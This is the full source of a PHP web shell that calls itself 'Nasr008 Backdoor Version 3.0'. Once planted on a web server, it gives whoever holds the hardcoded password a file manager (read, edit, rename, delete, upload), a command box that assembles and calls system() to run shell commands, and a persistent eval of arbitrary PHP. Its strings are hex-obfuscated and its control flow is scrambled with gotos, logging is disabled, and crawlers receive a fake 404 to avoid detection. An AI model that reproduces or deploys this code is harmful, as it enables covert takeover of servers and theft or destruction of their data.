<?php

###############################
# Nasr008 Backdoor Version 3.0 #
###############################

error_reporting(0);
@clearstatcache();
@ini_set('error_log', null);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
$passwd = "open";
goto E0nyK;
YJfwp:
if ($_GET["\x72\145\156\x61\155\x65"] == "\164\x72\x75\x65") {
    echo "\x3c\146\157\162\x6d\x20\145\x6e\143\x74\171\x70\145\75\x22\155\165\x6c\164\x69\x70\141\x72\164\57\x66\x6f\162\155\55\x64\141\x74\141\x22\40\155\x65\x74\x68\x6f\144\x3d\42\160\x6f\163\x74\x22\76\xa\x20\40" .
        htmlspecialchars($_GET["\x66\x69\x6c\145"]) .
        "\40\x5b\x20\x54\x6f\40\x5d\x20\74\151\x6e\160\165\164\x20\164\171\160\145\x3d\x22\x74\145\170\164\x22\x20\156\141\x6d\145\75\x22\162\145\156\x61\x6d\x65\137\146\x69\154\x65\x22\x3e\12\40\x20\x3c\151\x6e\x70\165\164\40\x74\171\160\x65\x3d\42\163\x75\142\155\x69\x74\42\x20\166\141\154\165\145\75\x22\122\x65\x6e\x61\155\x65\42\76\xa\x20\x20\74\57\x66\x6f\x72\155\x3e\xa\40\40";
    if ($_POST["\162\145\x6e\x61\155\145\137\x66\151\154\145"]) {
        if (
            rename(
                $_GET["\x66\151\154\145"],
                $_POST["\x72\145\156\141\155\145\x5f\x66\x69\x6c\x65"]
            )
        ) {
            echo "\x3c\163\143\x72\151\x70\164\76\x61\x6c\x65\162\164\50\x27\x53\x75\x63\143\145\163\163\x20\122\145\x6e\141\x6d\x65\x64\x20\41\41\41\x27\51\73\40\x77\x69\x6e\x64\x6f\x77\x2e\x6c\157\143\x61\164\151\x6f\x6e\40\75\40\x27\x3f\47\73\x3c\x2f\163\143\x72\x69\x70\164\x3e";
        } else {
            echo "\x3c\x73\x63\x72\x69\160\x74\76\141\154\145\x72\164\50\x27\106\x61\151\x6c\x65\x64\x20\122\x65\156\x61\155\145\x64\40\x21\41\x21\47\x29\73\x20\x77\151\156\x64\157\x77\x2e\154\x6f\x63\141\164\x69\x6f\156\40\x3d\40\x27\77\x27\x3b\74\57\163\x63\162\x69\160\x74\x3e";
        }
    }
}
goto fyVmZ;
moFyl:
if ($_GET["\145\x64\151\164"] == "\164\162\x75\x65") {
    echo "\x3c\146\157\162\155\40\x65\x6e\x63\x74\x79\x70\145\75\42\x6d\x75\154\164\x69\160\x61\x72\x74\57\x66\x6f\162\x6d\x2d\x64\141\164\x61\42\x20\x6d\145\x74\x68\157\144\x3d\x22\x70\157\163\x74\x22\x3e\xa\x20\40\74\x74\x65\x78\x74\141\162\x65\141\x20\x73\164\x79\154\x65\75\42\167\x69\144\x74\150\x3a\x20\61\60\60\x25\x3b\x20\150\145\x69\147\150\x74\x3a\x20\61\x35\60\160\x78\73\42\x20\x6e\x61\155\145\75\42\145\144\151\164\x5f\x66\151\154\145\x22\76" .
        htmlspecialchars(file_get_contents($_GET["\146\x69\154\x65"])) .
        "\74\x2f\x74\145\170\164\141\162\x65\141\x3e\xa\x20\40\x3c\142\162\76\74\x62\162\76\xa\x20\40\106\151\154\x65\40\x4e\x61\x6d\x65\40\72\40\x3c\151\156\160\x75\164\40\x74\x79\160\x65\75\x22\x74\x65\x78\164\42\40\156\x61\155\x65\x3d\x22\156\x61\155\141\137\146\42\x20\166\141\x6c\x75\145\x3d\x22{$_GET["\x66\151\x6c\145"]}\x22\x3e\xa\x20\x20\x3c\x62\x72\x3e\x3c\142\162\76\12\x20\x20\74\x69\x6e\160\165\164\40\x74\x79\160\x65\75\42\163\x75\142\155\151\164\x22\40\166\x61\154\165\x65\x3d\x22\x53\x61\x76\145\x20\106\151\154\145\x22\76\xa\x20\x20\74\x2f\146\157\x72\155\76\12\40\40";
    if ($_POST["\145\144\x69\x74\137\x66\151\x6c\145"]) {
        unlink($_GET["\x66\151\x6c\x65"]);
        $fedit = fopen($_POST["\156\x61\155\x61\137\146"], "\167");
        if (fwrite($fedit, $_POST["\x65\144\151\x74\137\x66\x69\x6c\x65"])) {
            fclose($fedit);
            echo "\74\x73\x63\x72\151\160\164\x3e\141\x6c\145\x72\x74\50\x27\x45\x64\151\x74\40\x46\x69\154\145\40\x53\165\x63\143\145\163\x73\40\x21\x21\x21\x27\x29\x3b\40\x77\x69\156\144\157\x77\56\x6c\x6f\143\x61\164\x69\x6f\x6e\40\75\x20\47\x3f\x66\x69\154\x65\x3d{$_POST["\x6e\x61\155\x61\x5f\x66"]}\47\73\x3c\x2f\x73\143\x72\x69\160\x74\x3e";
        } else {
            echo "\x3c\163\143\162\x69\x70\x74\76\x61\x6c\145\x72\x74\50\x27\105\x64\151\164\x20\x46\151\x6c\145\x20\106\x61\x69\x6c\145\144\x20\x21\x21\41\47\x29\x3b\x20\167\x69\156\144\x6f\167\56\x6c\x6f\143\x61\x74\x69\157\x6e\x20\x3d\40\x27\77\146\151\154\145\75{$_POST["\x6e\x61\x6d\141\137\146"]}\47\x3b\74\x2f\163\x63\162\151\160\164\76";
        }
    }
}
goto YJfwp;
oZuYQ:
?>
</form>
<center>[ <a href="?">Home Directory</a> ] [ <a href="?eval=code">Persistent Eval Code</a> ] [ <a href="?logout=true">Log Out</a> ]</center>
<form enctype="multipart/form-data" method="post">
	<font style="color:#0ff">{WebShell}</font> -> <input name="0"><input type="submit" value=">">
</form><textarea style="width:100%;height:150px;color:#0ff"><?php
goto OS0vz;
q5deJ:
if ($_GET["\x64\145\x6c\145\164\x65"] == "\x74\162\x75\145") {
    if (unlink($_GET["\146\x69\x6c\x65"])) {
        echo "\x3c\163\143\x72\151\160\164\76\x61\x6c\x65\x72\x74\x28\x27\106\x69\x6c\145\40\104\145\154\x65\x74\x65\x64\x20\x21\41\x21\47\51\x3b\40\x77\x69\156\x64\x6f\167\x2e\154\x6f\143\x61\164\x69\157\x6e\x20\75\x20\x27\77\47\x3b\x3c\57\x73\x63\x72\151\160\x74\x3e";
    } else {
        echo "\x3c\163\143\x72\x69\x70\x74\76\x61\x6c\145\162\x74\50\x27\124\x68\151\163\x20\x46\151\x6c\145\x20\151\x73\x20\x46\141\151\x6c\x65\144\x20\x44\x65\x6c\x65\164\145\40\x21\x21\41\47\x29\73\x20\x77\x69\156\x64\x6f\x77\x2e\x6c\x6f\x63\141\164\151\x6f\156\40\75\40\47\77\x27\x3b\74\x2f\163\x63\162\x69\x70\164\x3e";
    }
}
goto WtTD1;
tnFEk:
if ($_GET["\146\x69\154\145"]) {
    if (
        !$_GET["\145\x64\151\164"] &&
        !$_GET["\x64\x65\x6c\x65\x74\145"] &&
        !$_GET["\162\x65\156\x61\x6d\x65"] &&
        !$_GET["\162\x6d\x66\157\x6c\144\x65\162"]
    ) {
        echo "\74\164\145\170\164\x61\x72\145\x61\40\163\164\171\154\145\75\42\x77\151\x64\164\x68\72\40\x31\60\60\x25\x3b\40\150\145\x69\x67\150\164\72\40\x31\x35\60\160\x78\73\x20\143\157\154\x6f\x72\72\40\x61\161\x75\x61\73\42\76" .
            htmlspecialchars(file_get_contents($_GET[file])) .
            "\x3c\x2f\x74\x65\170\x74\x61\x72\x65\x61\76";
    }
}
goto moFyl;
E0nyK:
$user_agent_block =
    "\x2f\107\x6f\x6f\147\x6c\145\174\127\150\x61\x74\163\101\160\160\x7c\x54\x65\x6c\145\x67\162\x61\x6d\174\142\x69\x6e\x67\174\102\x69\x6e\147\174\x79\141\150\157\x6f\174\x59\141\x68\157\x6f\x7c\x4d\123\116\102\157\164\x7c\x53\x6c\x75\x72\160\x7c\120\171\143\125\122\114\x7c\146\x61\143\145\x62\x6f\x6f\153\x7c\151\141\137\141\x72\143\x68\x69\166\145\162\x7c\x63\x72\141\167\x6c\x65\162\x7c\131\141\156\144\145\170\57";
goto IkSQ_;
daXgu:
echo "\40" . php_uname();
goto Yu8N5;
OvE5M:
if ($_SESSION["\145\166\x61\x6c\x5f\x63\x6f\x64\x65"]) {
    if ($_GET["\145\x76\x61\x6c"] == "\143\154\x65\141\x72") {
        unset($_SESSION["\x65\x76\141\x6c\137\x63\157\x64\x65"]);
        echo "\x3c\163\143\x72\x69\x70\164\x3e\x77\x69\x6e\144\x6f\x77\56\x6c\157\143\x61\x74\151\x6f\x6e\x20\75\x20\47\77\x27\73\74\x2f\163\143\x72\151\160\164\x3e";
    }
    echo "\x3c\x74\x69\x74\154\x65\x3e\x53\x6d\x6f\153\145\x72\40\x42\141\x63\x6b\144\x6f\157\x72\x3c\x2f\164\151\x74\154\145\x3e";
    echo "\x3c\x64\151\166\40\163\164\x79\154\145\x3d\42\155\x61\162\147\x69\x6e\72\x20\x30\x3b\x20\x70\141\144\144\151\x6e\147\x3a\40\x32\x30\160\170\x3b\x20\142\141\x63\153\147\x72\157\165\x6e\144\72\x20\142\154\x61\x63\153\x3b\42\x3e";
    echo "\74\x61\x20\163\x74\171\154\145\x3d\x22\155\141\162\147\151\156\72\40\61\60\160\170\x3b\40\x74\145\170\164\x2d\x64\145\x63\157\162\x61\164\x69\x6f\x6e\72\40\156\157\x6e\x65\73\40\143\157\x6c\157\x72\72\x20\x62\154\141\x63\153\x3b\x20\146\x6f\156\164\55\163\151\172\145\72\40\x35\60\160\x78\73\40\x70\x61\x64\x64\x69\156\147\72\x20\x31\60\160\170\73\40\x62\141\x63\x6b\147\x72\157\165\x6e\x64\72\x20\x77\x68\151\x74\x65\73\x22\x20\150\x72\x65\x66\x3d\42\77\145\166\141\x6c\75\x63\154\145\141\x72\x22\x3e\x43\154\x65\x61\162\40\105\166\x61\x6c\x3c\57\x61\x3e";
    echo "\74\x66\157\156\x74\x20\163\164\x79\x6c\145\75\x22\x6d\x61\162\x67\x69\156\x3a\40\61\60\x70\170\73\x20\160\141\144\144\x69\x6e\147\x3a\40\x31\60\160\x78\x3b\40\x62\x61\143\x6b\x67\x72\x6f\x75\x6e\x64\72\40\x77\150\x69\164\x65\73\x20\143\x6f\x6c\157\x72\x3a\40\x62\154\141\143\153\x3b\40\x66\157\x6e\164\55\163\x69\172\145\x3a\40\x35\x30\x70\x78\x3b\x22\76\123\155\x6f\x6b\145\x72\40\x42\141\143\x6b\144\x6f\x6f\x72\x3c\x2f\x66\157\156\x74\76";
    echo "\74\x2f\x64\x69\166\76\74\x68\162\x3e";
    eval("\77\x3e" . $_SESSION["\x65\166\141\154\137\143\x6f\x64\x65"]);
    die();
}
goto kkx_J;
d6BAD:
?>
<html><head><title>Nasr008 Backdoor</title><link href="https://i.screenshot.net/z7xj4fg"rel="icon"><style>html{background:url(https://wallup.net/wp-content/uploads/2016/01/245263-space-smoke-men-748x421.jpg);background-size:cover;background-color:#000;background-repeat:no-repeat;background-position:center;background-attachment:fixed;height:100%;color:#fff}a{text-decoration:none;color:#0ff}tr:hover{background:#fff;color:#000}tr:hover a{text-decoration:none;color:#000}input{background:0 0;color:#0ff;border:1px solid #fff}textarea{background:0 0;color:#fff}</style></head><body><center><font style="color:#0ff"size="10">Nasr008 Backdoor</font><br><br>Kernel :<?php
goto daXgu;
XLgGh:
foreach ($exp as $x => $dirx) {
    if (empty($dirx)) {
        continue;
    }
    $do .= "\57\74\x61\x20\150\162\x65\146\x3d\47\x3f\x64\75";
    for ($i = 0; $i <= $x; $i++) {
        $do .= $exp[$i] . "\57";
    }
    $do .= "\47\76{$dirx}\x3c\x2f\x61\x3e";
}
goto xaTFb;
Ea0A3:
if (empty($_GET["\x66\x69\154\145"])) { ?>
<table width="100%"><tr><th class="c"style="border:1px solid #fff">Name File</th><th class="c"style="border:1px solid #fff"colspan="2">Action</th></tr><?php
$scndir = scandir($dir);
foreach ($scndir as $sdir) {
    if (is_dir($dir . "\57" . $sdir)) {
        echo "\74\164\x72\76\xa\40\x20\x20\x20\40\40\x3c\x74\x64\76\x3c\x61\40\x68\162\145\146\75\47\77\x64\75{$dir}\57{$sdir}\x27\x3e\74\x69\x6d\147\40\x68\145\x69\x67\x68\164\75\x27\62\60\x27\x20\x73\162\x63\75\47\150\x74\164\160\x3a\x2f\57\151\x63\x6f\x6e\x73\56\151\143\x6f\156\x61\162\143\150\x69\166\x65\x2e\x63\157\155\57\x69\x63\157\x6e\163\x2f\160\x61\x6f\x6d\145\144\x69\141\x2f\x73\x6d\x61\x6c\x6c\x2d\156\55\x66\154\141\x74\57\x31\60\62\x34\x2f\x66\x6f\x6c\144\x65\162\55\151\x63\157\x6e\x2e\160\156\x67\x27\x2f\76\40" .
            htmlspecialchars($sdir) .
            "\x3c\57\141\x3e\74\57\x74\144\76\12\40\x20\40\x20\40\40\x3c\164\144\76\74\x61\40\150\x72\x65\146\x3d\x27\77\146\151\x6c\145\75{$dir}\x2f{$sdir}\46\x72\145\156\141\x6d\145\x3d\164\162\x75\x65\47\x3e\x52\x65\156\x61\155\x65\x3c\x2f\x61\x3e\x3c\57\164\144\x3e\xa\x20\40\40\x20\40\40\x3c\164\x64\x3e\x3c\141\x20\150\162\145\146\75\47\77\x66\x6f\x6c\144\x65\x72\75{$dir}\57{$sdir}\x26\x72\155\x66\x6f\x6c\144\145\x72\75\x74\162\165\x65\47\x3e\104\x65\154\x65\x74\x65\x3c\x2f\141\76\x3c\x2f\x74\x64\76\12\40\x20\40\40\x20\x20\74\x2f\164\162\76\xa\40\40\40\x20\40\40";
    }
    if (is_file($dir . "\57" . $sdir)) {
        echo "\74\x74\x72\x3e\xa\40\40\40\40\40\x20\x3c\x74\x64\x3e\74\x61\x20\x68\x72\145\146\x3d\x27\x3f\x66\x69\154\145\x3d{$dir}\57{$sdir}\47\x3e\x3c\151\x6d\147\x20\x68\x65\x69\147\150\x74\x3d\x27\x32\x30\47\40\163\162\143\x3d\x27\x68\x74\x74\x70\72\57\x2f\x69\143\157\x6e\x73\x2e\x69\143\157\x6e\141\x72\143\150\151\x76\145\56\143\x6f\155\x2f\151\143\157\x6e\163\57\172\x68\x6f\x6f\154\145\147\157\x2f\155\141\164\145\162\x69\x61\154\57\65\x31\x32\57\106\x69\154\145\x74\x79\160\145\x2d\x44\x6f\143\163\55\151\143\157\156\56\x70\156\x67\47\x2f\76\40" .
            htmlspecialchars($sdir) .
            "\x3c\x2f\141\76\74\57\x74\x64\x3e\xa\x20\40\x20\x20\x20\x20\74\164\144\x3e\x3c\141\x20\150\162\145\146\75\47\x3f\x66\x69\154\145\75{$dir}\57{$sdir}\x26\145\144\151\164\x3d\x74\162\165\145\47\76\105\144\x69\164\74\57\141\x3e\74\x2f\164\144\76\xa\x20\40\x20\x20\x20\x20\x3c\x74\144\76\74\141\40\150\x72\145\x66\75\x27\x3f\146\151\x6c\x65\x3d{$dir}\x2f{$sdir}\x26\x64\x65\154\145\x74\145\75\164\162\165\x65\47\x3e\x44\x65\154\145\x74\145\x3c\x2f\x61\76\74\57\164\144\76\12\x20\40\x20\x20\40\x20\x3c\57\x74\162\76\xa\x20\x20\x20\x20\x20\40";
    }
}
?>
</table><?php }
goto YzdzG;
sgVNB:
session_start();
goto Gfdbd;
PN0tu:
if ($_FILES["\x75\x70\144"]) {
    if (
        copy(
            $_FILES["\x75\x70\x64"]["\164\155\160\137\156\141\x6d\145"],
            $dir . "\x2f" . $_FILES["\165\160\x64"]["\156\141\155\x65"]
        )
    ) { ?>
<b>Uploaded</b><?php } else { ?>
<b>Failed Upload</b><?php }
}
goto oZuYQ;
Xgxen:
?>
<br><br><form enctype="multipart/form-data"method="post">Upload : <input type="file"name="upd"><input type="submit"value="Upload"><?php
goto PN0tu;
f8ftD:
if (empty($_SESSION["\x65\156\x74\145\162"])) { ?>
<html><head><title>Nasr008 Backdoor</title><link href="https://i.screenshot.net/z7xj4fg"rel="icon"><style>html{background:url(https://wallup.net/wp-content/uploads/2016/01/245263-space-smoke-men-748x421.jpg);background-size:cover;background-color:#000;background-repeat:no-repeat;background-position:center;background-attachment:fixed;color:#fff}input{background:0 0;color:#0ff;border:1px solid #fff}</style></head><body><table width="100%"height="100%"><td align="center"><font style="color:#0ff"size="10">Nasr008 Backdoor</font><br><br>Smoking, Like Exploring The Universe<br><br><form enctype="multipart/form-data"method="post"><input type="password"name="passwd"> <input type="submit"name="pass"value="Login"></form></td></table></body></html><?php die();}
goto OvE5M;
OS0vz:
if ($_POST["\x30"]) {
    echo htmlspecialchars(
        ($_[0][] = @$_POST["\x30"]) .
            ($_[1][] = "\x73") .
            ($_[1][] = "\x79") .
            ($_[1][] = "\x73\x74") .
            ($_[1][] = "\145\x6d") .
            ($l = @get_defined_vars()["\137"][1]) .
            ($� .= $l[0]) .
            ($� .= $l[1]) .
            ($� .= $l[2]) .
            ($� .= $l[3]) .
            $�("{$_[0][0]}")
    );
}
goto zpMlc;
BfL3d:
$exp = explode("\x2f", $dir_raw);
goto XLgGh;
Yu8N5:
?>
</center><br><br>Path :<?php
goto sKxnQ;
Gfdbd:
if ($_POST["\x70\141\x73\163"]) {
    if ($_POST["\x70\141\163\x73\167\x64"] == $passwd) {
        $_SESSION["\145\156\x74\x65\x72"] = "\x65\156\x74\145\162";
        header("\114\157\143\141\164\x69\x6f\156\x3a\x20\77");
    }
}
goto ee6wM;
zpMlc:
?>
</textarea><br><br>
<center><?php
goto tnFEk;
ee6wM:
if (isset($_REQUEST["\x6c\x6f\147\157\165\x74"])) {
    session_destroy();
    header("\114\x6f\143\x61\164\x69\157\156\72\x20\77");
}
goto f8ftD;
IkSQ_:
if (
    preg_match(
        $user_agent_block,
        $_SERVER["\110\124\x54\120\137\125\123\105\x52\137\101\x47\x45\116\x54"]
    )
) {
    header(
        "\x48\124\124\120\x2f\61\x2e\x30\x20\x34\60\x34\x20\116\157\x74\40\106\x6f\165\x6e\x64"
    );
    die();
}
goto sgVNB;
sKxnQ:
echo "\40" . $do;
goto Xgxen;
WtTD1:
if ($_GET["\x65\x76\141\154"] == "\143\157\144\145") {
    if ($_POST["\x65\166\x61\154\137\143\157\x64\145"]) {
        $_SESSION["\x65\x76\141\154\137\x63\x6f\144\145"] =
            $_POST["\x65\x76\x61\154\x5f\x63\157\x64\145"];
        echo "\x3c\163\x63\x72\151\160\164\x3e\x77\x69\x6e\x64\x6f\167\x2e\154\x6f\x63\x61\x74\151\x6f\x6e\x20\75\40\47\77\x27\73\x3c\x2f\x73\143\162\151\x70\164\x3e";
    }
    echo "\x3c\146\157\156\164\x20\x73\151\x7a\x65\75\x22\61\x30\42\x3e\120\145\x72\x73\x69\x73\x74\x65\x6e\164\40\105\x76\x61\154\x20\103\157\144\145\74\x2f\146\157\x6e\164\x3e\x3c\142\162\76\74\142\162\x3e\74\x66\157\162\155\40\145\x6e\143\164\171\160\x65\75\42\x6d\165\x6c\x74\x69\160\x61\162\x74\x2f\146\x6f\162\x6d\55\x64\x61\x74\141\42\x20\x6d\145\x74\x68\157\x64\x3d\x22\x70\157\163\x74\42\76\xa\x20\40\74\x74\x65\170\164\x61\x72\x65\141\40\163\164\171\x6c\x65\x3d\42\x77\x69\x64\x74\x68\72\x20\x31\x30\60\x25\x3b\40\150\145\151\x67\x68\164\x3a\40\x32\65\60\160\170\73\x22\40\x6e\141\x6d\145\75\42\145\x76\x61\x6c\137\x63\x6f\144\x65\x22\76\x3c\x2f\164\x65\170\164\141\x72\x65\141\x3e\xa\x20\40\40\40\40\40\40\x20\40\x20\40\x20\x3c\x62\x72\x3e\x3c\x62\162\76\xa\x20\40\x20\x20\40\40\x20\x20\40\x20\40\40\74\151\156\x70\165\164\40\x74\171\x70\x65\x3d\x22\x73\x75\142\x6d\151\x74\x22\40\x76\141\x6c\x75\145\75\42\105\166\141\x6c\x22\x3e\xa\x20\40\x20\40\40\x20\40\40\x20\40\40\40\x3c\57\146\x6f\x72\x6d\76";
}
goto Ea0A3;
xaTFb:
if ($_GET["\144"]) {
    $dir = $_GET["\144"];
} else {
    $dir = str_replace("\134", "\57", getcwd());
}
goto d6BAD;
fyVmZ:
if ($_GET["\162\x6d\146\157\154\144\x65\x72"] == "\x74\162\165\145") {
    if (rmdir($_GET["\146\157\x6c\144\x65\162"])) {
        echo "\x3c\163\x63\x72\151\x70\x74\x3e\x61\x6c\x65\162\164\x28\x27\x46\157\154\x64\145\x72\x20\x44\145\154\145\164\145\144\x20\41\41\x21\47\51\x3b\40\x77\x69\156\x64\x6f\x77\56\154\x6f\143\x61\164\151\157\x6e\x20\75\x20\47\x3f\47\x3b\74\x2f\163\143\x72\151\160\x74\76";
    } else {
        echo "\x3c\x73\143\162\x69\160\164\76\141\154\x65\162\164\x28\x27\124\150\x69\163\40\106\157\x6c\144\145\162\x20\151\x73\40\x46\x61\151\154\145\144\40\104\x65\154\145\164\145\40\41\x21\41\47\51\x3b\40\167\151\156\x64\157\167\x2e\154\x6f\143\141\x74\151\x6f\156\40\75\40\x27\77\x27\73\x3c\x2f\163\143\x72\151\x70\x74\76";
    }
}
goto q5deJ;
kkx_J:
if ($_GET["\x64"]) {
    $dir_raw = $_GET["\144"];
    chdir($_GET["\144"]);
} else {
    $dir_raw = str_replace("\x5c", "\57", getcwd());
}
goto BfL3d;
YzdzG:
?>
</center><br>
<div style="padding:10px;border:1px solid #fff;color:#0ff;text-align:center">Nasr008 Backdoor</div>
</body>

</html>
